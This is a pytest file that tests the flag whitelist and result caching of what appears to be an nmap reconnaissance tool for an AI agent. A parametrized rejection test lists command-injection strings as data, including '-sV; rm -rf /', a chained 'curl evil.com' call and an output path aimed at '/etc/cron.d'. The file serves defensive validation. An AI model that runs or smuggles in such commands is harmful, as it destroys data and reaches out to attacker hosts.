"""Unit tests for nmap flag whitelist and result caching."""

from __future__ import annotations

from unittest.mock import patch, MagicMock

import pytest

from cyberai.agents.recon import nmap_tool
from cyberai.agents.recon.nmap_tool import validate_flags, run_nmap


# ── flag whitelist ────────────────────────────────────────────────────


def test_allowed_flags_pass():
    assert validate_flags("-sV -T4 --top-ports 1000") == [
        "-sV",
        "-T4",
        "--top-ports",
        "1000",
    ]


def test_value_flag_keeps_its_argument():
    assert validate_flags("-p 80,443 -sV") == ["-p", "80,443", "-sV"]


@pytest.mark.parametrize(
    "bad",
    [
        "-sV; rm -rf /",
        "-oN /etc/cron.d/x",
        "--script=http-vuln",
        "-sV && curl evil.com",
        "--unsafe-flag",
    ],
)
def test_unknown_flags_rejected(bad):
    with pytest.raises(ValueError):
        validate_flags(bad)


def test_run_nmap_rejects_unsafe_flags_gracefully():
    """Unsafe flags must not crash — run_nmap returns an error dict."""
    result = run_nmap("scanme.test", flags="-sV; rm -rf /")
    assert "error" in result
    assert "unsafe" in result["error"].lower()


# ── caching ───────────────────────────────────────────────────────────


@pytest.fixture(autouse=True)
def _clean_cache():
    nmap_tool._nmap_cache.clear()
    yield
    nmap_tool._nmap_cache.clear()


def _fake_proc(stdout: str = "", rc: int = 0) -> MagicMock:
    proc = MagicMock()
    proc.stdout = stdout
    proc.stderr = ""
    proc.returncode = rc
    return proc


def test_cache_miss_then_hit():
    """First call runs nmap; second identical call comes from cache."""
    fake = _fake_proc(stdout="<nmaprun></nmaprun>", rc=0)
    with patch.object(nmap_tool.subprocess, "run", return_value=fake) as m:
        first = run_nmap("scanme.test", flags="-sV")
        second = run_nmap("scanme.test", flags="-sV")

    assert first["cached"] is False
    assert second["cached"] is True
    # subprocess.run called only once — second served from cache
    assert m.call_count == 1


def test_failed_scan_not_cached():
    """A non-zero return code must not be cached."""
    fake = _fake_proc(stdout="", rc=1)
    with patch.object(nmap_tool.subprocess, "run", return_value=fake) as m:
        run_nmap("scanme.test", flags="-sV")
        run_nmap("scanme.test", flags="-sV")

    # both calls hit subprocess — nothing was cached
    assert m.call_count == 2


def test_different_flags_different_cache():
    """Different flags must not collide in the cache."""
    fake = _fake_proc(stdout="<nmaprun></nmaprun>", rc=0)
    with patch.object(nmap_tool.subprocess, "run", return_value=fake) as m:
        run_nmap("scanme.test", flags="-sV")
        run_nmap("scanme.test", flags="-sV -Pn")

    # different flag strings -> two real scans
    assert m.call_count == 2
